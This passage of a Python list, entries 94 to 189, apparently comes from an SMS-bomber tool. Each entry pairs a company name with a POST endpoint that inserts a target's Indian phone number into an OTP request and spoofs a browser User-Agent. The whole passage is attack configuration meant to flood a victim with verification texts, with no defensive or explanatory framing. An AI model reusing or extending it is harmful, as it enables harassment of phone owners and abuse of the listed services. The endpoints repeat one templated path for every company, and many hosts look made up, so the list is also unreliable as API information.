# 94
{
    'name': 'Discover_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.discover.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 95
{
    'name': 'DinersClub_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dinersclub.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 96
{
    'name': 'Google_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://cloud.google.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 97
{
    'name': 'AWS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://aws.amazon.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 98
{
    'name': 'Azure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://azure.microsoft.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 99
{
    'name': 'Oracle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.oracle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 100
{
    'name': 'IBM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ibm.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 101
{
    'name': 'SAP_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 102
{
    'name': 'Salesforce_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.salesforce.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 103
{
    'name': 'HubSpot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hubspot.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 104
{
    'name': 'Zoho_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zoho.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 105
{
    'name': 'Freshworks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.freshworks.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 106
{
    'name': 'ServiceNow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.servicenow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 107
{
    'name': 'Atlassian_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.atlassian.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 108
{
    'name': 'Slack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 109
{
    'name': 'Zoom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zoom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 110
{
    'name': 'Microsoft_Teams_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.teams.microsoft.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 111
{
    'name': 'Google_Meet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meet.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 112
{
    'name': 'Cisco_Webex_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.webex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 113
{
    'name': 'Adobe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.adobe.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 114
{
    'name': 'Figma_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.figma.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 115
{
    'name': 'Canva_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.canva.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 116
{
    'name': 'Sketch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sketch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 117
{
    'name': 'InVision_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.invisionapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 118
{
    'name': 'Marvel_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.marvelapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 119
{
    'name': 'Proto.io_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.proto.io/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 120
{
    'name': 'UXPin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.uxpin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 121
{
    'name': 'Balsamiq_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.balsamiq.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 122
{
    'name': 'Axure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.axure.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 123
{
    'name': 'MockFlow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mockflow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 124
{
    'name': 'Wireframe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wireframe.cc/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 125
{
    'name': 'Mockplus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mockplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 126
{
    'name': 'JustInMind_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.justinmind.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 127
{
    'name': 'Pidoco_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pidoco.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 128
{
    'name': 'HotGloo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hotgloo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 129
{
    'name': 'FluidUI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fluidui.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 130
{
    'name': 'Framer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.framer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 131
{
    'name': 'Origami_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.origami.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 132
{
    'name': 'Principle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.principle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 133
{
    'name': 'Keynote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keynote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 134
{
    'name': 'PowerPoint_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.powerpoint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 135
{
    'name': 'Google_Slides_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slides.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 136
{
    'name': 'Prezi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.prezi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 137
{
    'name': 'SlideShare_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slideshare.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 138
{
    'name': 'HaikuDeck_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.haikudeck.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 139
{
    'name': 'Emaze_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.emaze.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 140
{
    'name': 'Sway_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sway.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 141
{
    'name': 'Visme_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.visme.co/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 142
{
    'name': 'Beautiful.ai_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.beautiful.ai/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 143
{
    'name': 'Gamma_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gamma.app/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 144
{
    'name': 'Tome_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tome.app/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 145
{
    'name': 'Pitch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pitch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 146
{
    'name': 'Zight_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zight.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 147
{
    'name': 'Loom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.loom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 148
{
    'name': 'ScreenRec_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.screenrec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 149
{
    'name': 'OBS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.obsproject.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 150
{
    'name': 'Streamlabs_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.streamlabs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 151
{
    'name': 'Twitch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.twitch.tv/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 152
{
    'name': 'YouTube_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.youtube.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 153
{
    'name': 'Reddit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.reddit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 154
{
    'name': 'TikTok_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tiktok.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 155
{
    'name': 'Snapchat_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://accounts.snapchat.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 156
{
    'name': 'Pinterest_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pinterest.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 157
{
    'name': 'Tumblr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumblr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 158
{
    'name': 'Flickr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.flickr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 159
{
    'name': 'Vimeo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vimeo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 160
{
    'name': 'Dailymotion_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dailymotion.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 161
{
    'name': 'SoundCloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 162
{
    'name': 'Spotify_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spotify.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 163
{
    'name': 'Apple_Music_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.applemusic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 164
{
    'name': 'Amazon_Music_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.amazonmusic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 165
{
    'name': 'Gaana_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gaana.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 166
{
    'name': 'JioSaavn_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.jiosaavn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 167
{
    'name': 'Wynk_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wynk.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 168
{
    'name': 'Hungama_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hungama.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 169
{
    'name': 'YouTube_Music_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.youtube.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 170
{
    'name': 'Tidal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tidal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 171
{
    'name': 'Deezer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deezer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 172
{
    'name': 'Pandora_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pandora.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 173
{
    'name': 'iHeartRadio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.iheartradio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 174
{
    'name': 'SiriusXM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.siriusxm.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 175
{
    'name': 'TuneIn_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tunein.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 176
{
    'name': 'Radioplayer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.radioplayer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 177
{
    'name': 'Audible_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.audible.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 178
{
    'name': 'Storytel_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.storytel.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 179
{
    'name': 'Kobo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kobo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 180
{
    'name': 'Scribd_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scribd.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 181
{
    'name': 'Medium_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.medium.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 182
{
    'name': 'Substack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.substack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 183
{
    'name': 'Ghost_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ghost.org/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 184
{
    'name': 'WordPress_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wordpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 185
{
    'name': 'Blogger_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blogger.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 186
{
    'name': 'Tumblr_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumblr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 187
{
    'name': 'LiveJournal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.livejournal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 188
{
    'name': 'Xing_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.xing.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 189
{
    'name': 'Viadeo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
